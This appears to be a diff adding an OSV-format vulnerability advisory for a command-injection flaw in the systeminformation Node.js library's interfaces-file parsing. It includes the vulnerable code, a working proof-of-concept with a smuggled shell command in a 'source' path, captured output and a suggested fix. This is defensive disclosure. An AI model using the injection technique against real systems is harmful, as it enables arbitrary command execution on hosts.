@@ -1,0 +1,139 @@
+{
+  "schema_version": "1.8.0",
+  "id": "DHI-pwfq-q3pk-xgbk-za7u",
+  "modified": "2026-09-21T16:28:20Z",
+  "published": "2026-09-21T16:28:20Z",
+  "upstream": [
+    "CVE-2026-50289"
+  ],
+  "summary": "### Summary",
+  "details": "### Summary\n\nOn Linux, `systeminformation`'s `networkInterfaces()` is vulnerable to OS command injection through the Debian/Ubuntu `interfaces(5)` `source` directive. While collecting per-interface DHCP state, the library reads `/etc/network/interfaces` and, for every `source <path>` line it encounters, extracts the path token *from the file content* and interpolates it **unquoted** into a shell command string that is run via `execSync()`. A `source` line whose path contains shell metacharacters executes arbitrary commands with the privileges of the calling Node.js process.\n\nThis is the same root-cause class as the previously-fixed NetworkManager-connection-name injection in this file: a value parsed out of local system state is re-interpolated into a shell command string without sanitization. The NetworkManager paths were converted to argument-array execution, but the `interfaces(5)` `source`-recursion sink in `checkLinuxDCHPInterfaces()` was left unfixed and still builds a shell string. The input to this sink is *unsanitized* (unlike the `iface`/`connectionName` paths, which pass through `util.sanitizeString` in strict mode before reaching their commands).\n\n### Impact\n\nAn attacker who can place or influence a `source`d path in `/etc/network/interfaces` (or any file it transitively `source`s) achieves command execution inside any process that calls `networkInterfaces()`. Realistic affected deployments are the same ones that motivate this library:\n\n- local inventory / asset agents\n- monitoring and diagnostics agents\n- admin-dashboard backends collecting host information\n- device-management / desktop agents\n\nIf such a process runs with elevated privileges, the injected command runs with those privileges. `networkInterfaces()` is a core, frequently-called API and is reached transitively by `getStaticData()` / `getAllData()`, so the sink is exercised by ordinary usage on Linux.\n\n### Threat model\n\nThe dangerous value is **not** a function argument supplied by the caller. It is read from the *content* of an `interfaces(5)` configuration file. The stock Debian/Ubuntu layout uses `source /etc/network/interfaces.d/*` and `source-directory` fan-out, so the parser routinely follows `source` directives into other files and re-parses their `source` lines. Any actor who can write a file that becomes reachable through that `source` chain — for example a lower-privileged process or configuration-management hook that drops a file into a `source`d directory, or a tool that materializes an interfaces snippet from semi-trusted input — controls the path token that lands in the shell command. No NetworkManager activation or special hardware is required; the only precondition is that one `source`d path string contains shell metacharacters.\n\n### Vulnerable code\n\n`lib/network.js`, `checkLinuxDCHPInterfaces()` (current `5.31.6` line numbers):\n\n```js\n// lib/network.js\nfunction checkLinuxDCHPInterfaces(file) {\n  let result = [];\n  try {\n    const cmd = `cat ${file} 2> /dev/null | grep 'iface\\\\|source'`;   // <-- unquoted ${file} -> shell sink\n    const lines = execSync(cmd, util.execOptsLinux).toString().split('\\n');\n\n    lines.forEach((line) => {\n      const parts = line.replace(/\\s+/g, ' ').trim().split(' ');\n      if (parts.length >= 4) {\n        if (line.toLowerCase().indexOf(' inet ') >= 0 && line.toLowerCase().indexOf('dhcp') >= 0) {\n          result.push(parts[1]);\n        }\n      }\n      if (line.toLowerCase().includes('source')) {\n        const file = line.split(' ')[1];                              // <-- path parsed FROM file content\n        result = result.concat(checkLinuxDCHPInterfaces(file));        // <-- recurses, re-feeding attacker path\n      }\n    });\n  } catch {\n    util.noop();\n  }\n  return result;\n}\n```\n\n`util.execOptsLinux` sets no `shell` option, so `execSync(cmd, util.execOptsLinux)` runs `cmd` through `/bin/sh`. The `${file}` token is interpolated raw — not quoted, not passed through `util.sanitizeString`/`sanitizeShellString` — so `;`, `$( )`, backticks, `|`, `&`, redirections, and even a bare space all break out of the intended `cat`/`grep` pipeline.\n\nReach chain to the public API:\n\n```js\n// lib/network.js, getLinuxDHCPNics()\nresult = checkLinuxDCHPInterfaces('/etc/network/interfaces');\n```\n\n```js\n// lib/network.js, networkInterfaces() (Linux branch)\n_dhcpNics = getLinuxDHCPNics();\n```\n\n`networkInterfaces()` is also reached by `getStaticData()` and `getAllData()` in `lib/index.js`.\n\n### Reproduction\n\nThe PoC exercises the **verbatim shipped sink function** extracted from the installed `node_modules/systeminformation/lib/network.js` (version pinned to `5.31.6`), bound to the same `child_process.execSync` and shipped `util.execOptsLinux` the library uses. It then drives the exact `source`-recursion data flow with a malicious sourced path. A negative control with a benign path confirms no execution occurs on well-formed input.\n\nInstall the pinned vulnerable version:\n\n```bash\nmkdir si-poc && cd si-poc\nnpm init -y >/dev/null\nnpm install systeminformation@5.31.6\n```\n\n`poc.js`:\n\n```js\nconst fs = require('fs');\nconst path = require('path');\nconst cp = require('child_process');\nconst libDir = path.join(__dirname, 'node_modules', 'systeminformation', 'lib');\nconst util = require(path.join(libDir, 'util.js'));\n\n// Load the VERBATIM shipped sink function from the installed library source.\nconst src = fs.readFileSync(path.join(libDir, 'network.js'), 'utf8');\nconst m = src.match(/function checkLinuxDCHPInterfaces\\(file\\) \\{[\\s\\S]*?\\n\\}\\n/);\nif (!m) { console.error('could not locate shipped function'); process.exit(2); }\n\n// Bind the same free vars network.js binds: execSync + util.\nconst execSync = cp.execSync;\nconst checkLinuxDCHPInterfaces =\n  new Function('execSync', 'util', m[0] + '\\nreturn checkLinuxDCHPInterfaces;')(execSync, util);\n\n// --- Malicious case: a sourced interfaces file with shell metacharacters in the path ---\nconst tmp = fs.mkdtempSync('/tmp/si-dhcp-');\nconst outer = path.join(tmp, 'interfaces');\nconst marker = path.join(tmp, 'PWNED');\nconst maliciousSource = `/dev/null;id>${marker};echo`;\nfs.writeFileSync(outer, `auto lo\\niface lo inet loopback\\nsource ${maliciousSource}\\n`);\n\nconsole.log('PRE  marker_exists=' + fs.existsSync(marker));\nconst res = checkLinuxDCHPInterfaces(outer);   // == networkInterfaces() -> getLinuxDHCPNics() path\nconsole.log('returned=' + JSON.stringify(res));\nconsole.log('POST marker_exists=' + fs.existsSync(marker));\nif (fs.existsSync(marker)) console.log('marker_contents=' + fs.readFileSync(marker, 'utf8').trim());\n\n// --- Negative control: a benign sourced path must NOT execute anything ---\nconst tmp2 = fs.mkdtempSync('/tmp/si-neg-');\nconst outer2 = path.join(tmp2, 'interfaces');\nconst inner2 = path.join(tmp2, 'iface.d');\nconst marker2 = path.join(tmp2, 'PWNED_NEG');\nfs.writeFileSync(inner2, 'iface eth0 inet dhcp\\n');\nfs.writeFileSync(outer2, `auto lo\\nsource ${inner2}\\n`);\nconsole.log('\\nNEG pre  marker_exists=' + fs.existsSync(marker2));\nconst res2 = checkLinuxDCHPInterfaces(outer2);\nconsole.log('NEG returned=' + JSON.stringify(res2));\nconsole.log('NEG post marker_exists=' + fs.existsSync(marker2));\n```\n\nRun it:\n\n```bash\nnode poc.js\n```\n\nVerbatim captured output (against `systeminformation@5.31.6`):\n\n```\nPRE  marker_exists=false\nreturned=[]\nPOST marker_exists=true\nmarker_contents=uid=501(rick) gid=20(staff) groups=20(staff),12(everyone),61(localaccounts),79(_appserverusr),80(admin),81(_appserveradm),701(com.apple.sharepoint.group.1),33(_appstore),98(_lpadmin),100(_lpoperator),204(_developer),250(_analyticsusers),395(com.apple.access_ftp),398(com.apple.access_screensharing),399(com.apple.access_ssh),400(com.apple.access_remote_ae)\n\nNEG pre  marker_exists=false\nNEG returned=[\"eth0\"]\nNEG post marker_exists=false\n```\n\nThe malicious `source` path caused the injected `id` command to run (marker created, contents = the calling process identity), while the benign `source` path parsed normally (`[\"eth0\"]`) and produced no marker. The injected command runs with the privileges of the Node.js process that called `networkInterfaces()`.\n\n### End-to-end reproduction\n\nThe transcript above is the end-to-end run against the pinned published artifact `systeminformation@5.31.6`, loading the shipped `lib/network.js` and `lib/util.js` from `node_modules`. Exact commands:\n\n```bash\nmkdir si-poc && cd si-poc\nnpm init -y >/dev/null\nnpm install systeminformation@5.31.6\n# place poc.js (from the Reproduction section) in this directory\nnode poc.js\n```\n\nThe marker file `PWNED` is created only by the injected command path; the negative-control marker `PWNED_NEG` is never created. The verbatim captured stdout is shown in the Reproduction section above.\n\n### Suggested fix\n\nStop building a shell string from a path that comes out of file content. Read the file with `fs` (no shell), or use argument-array execution, and never interpolate a parsed `source` path into a shell command. For example:\n\n```js\nfunction checkLinuxDCHPInterfaces(file) {\n  let result = [];\n  try {\n    // No shell: read the file directly and filter in JS.\n    const content = require('fs').readFileSync(file, { encoding: 'utf8' });\n    const lines = content.split('\\n').filter((l) => /iface|source/.test(l));\n    lines.forEach((line) => {\n      const parts = line.replace(/\\s+/g, ' ').trim().split(' ');\n      if (parts.length >= 4 &&\n          line.toLowerCase().indexOf(' inet ') >= 0 &&\n          line.toLowerCase().indexOf('dhcp') >= 0) {\n        result.push(parts[1]);\n      }\n      if (line.toLowerCase().includes('source')) {\n        const sourced = line.split(' ')[1];\n        result = result.concat(checkLinuxDCHPInterfaces(sourced));\n      }\n    });\n  } catch {\n    require('./util').noop();\n  }\n  return result;\n}\n```\n\nIf shelling out is preferred, replace the `cat`/`grep` shell string with argument-array execution as shown below, so the path is passed as a single argv element and the shell never re-parses it:\n\n```js\nconst { execFileSync } = require('child_process');\nconst content = execFileSync('cat', [file], util.execOptsLinux).toString();\n```\n\nQuoting alone is insufficient. Treat every value parsed from `interfaces(5)` files as untrusted even though it originates from local system state, consistent with the defensive `util.sanitizeString` pattern already applied to the interface name and NetworkManager connection name on the sibling paths.\n\n### Fix PR\n\nA fix is provided on a private temporary fork (not pushed to any public fork during the embargo). The branch replaces the `cat ${file}` shell string in `checkLinuxDCHPInterfaces()` with a non-shell `fs.readFileSync` read and adds a Linux regression test that points the function at an `interfaces` file containing a `source` directive with shell metacharacters and asserts that no side-effect command runs (no marker file is produced) while a benign sourced DHCP interface is still parsed.\n\n### Credit\n\nReported by tonghuaroot.",
+  "severity": [
+    {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"
+    },
+    {
+      "type": "CVSS_V4",
+      "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images",
+        "name": "homepage",
+        "purl": "pkg:docker/dhi/homepage?os_name=debian&os_version=13"
+      },
+      "versions": [
+        "1.12.3-debian13",
+        "1.12.3-debian13-dev",
+        "1.12.3-debian13-fips",
+        "1.12.3-debian13-fips-dev",
+        "1.13.0-debian13",
+        "1.13.0-debian13-dev",
+        "1.13.0-debian13-fips",
+        "1.13.0-debian13-fips-dev",
+        "1.13.1-debian13",
+        "1.13.1-debian13-dev",
+        "1.13.1-debian13-fips",
+        "1.13.1-debian13-fips-dev",
+        "1.13.2-debian13",
+        "1.13.2-debian13-dev",
+        "1.13.2-debian13-fips",
+        "1.13.2-debian13-fips-dev"
+      ],
+      "database_specific": {
+        "owner_kind": "IMAGE"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images",
+        "name": "kibana",
+        "purl": "pkg:docker/dhi/kibana?os_name=debian&os_version=12"
+      },
+      "versions": [
+        "9.0.5-debian12"
+      ],
+      "database_specific": {
+        "owner_kind": "IMAGE"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images",
+        "name": "kibana",
+        "purl": "pkg:docker/dhi/kibana?os_name=debian&os_version=13"
+      },
+      "versions": [
+        "9.0.5-debian13",
+        "9.0.6-debian13",
+        "9.0.7-debian13",
+        "9.0.8-debian13",
+        "9.1.10-debian13",
+        "9.1.2-debian13",
+        "9.1.3-debian13",
+        "9.1.4-debian13",
+        "9.1.5-debian13",
+        "9.1.6-debian13",
+        "9.1.7-debian13",
+        "9.1.8-debian13",
+        "9.1.9-debian13",
+        "9.2.0-debian13",
+        "9.2.1-debian13",
+        "9.2.2-debian13",
+        "9.2.3-debian13",
+        "9.2.4-debian13",
+        "9.2.5-debian13",
+        "9.2.6-debian13",
+        "9.2.8-debian13",
+        "9.3.0-debian13",
+        "9.3.1-debian13",
+        "9.3.3-debian13",
+        "9.3.4-debian13",
+        "9.3.5-debian13",
+        "9.3.7-debian13",
+        "9.4.1-debian13",
+        "9.4.2-debian13"
+      ],
+      "database_specific": {
+        "owner_kind": "IMAGE"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "ADVISORY",
+      "url": "https://scout.docker.com/v/DHI-pwfq-q3pk-xgbk-za7u"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://github.com/advisories/GHSA-5xpp-75jx-m839"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://github.com/sebhildebrandt/systeminformation/security/advisories/GHSA-5xpp-75jx-m839"
+    },
+    {
+      "type": "FIX",
+      "url": "https://github.com/sebhildebrandt/systeminformation/commit/bbfddde48672d0ee124fefdb3cb4442fd9dd4f03"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/sebhildebrandt/systeminformation/releases/tag/v5.31.7"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://security-tracker.debian.org/tracker/CVE-2026-50289"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://ubuntu.com/security/CVE-2026-50289"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "http://people.ubuntu.com/~ubuntu-security/cve/CVE-2026-50289"
+    }
+  ]
+}
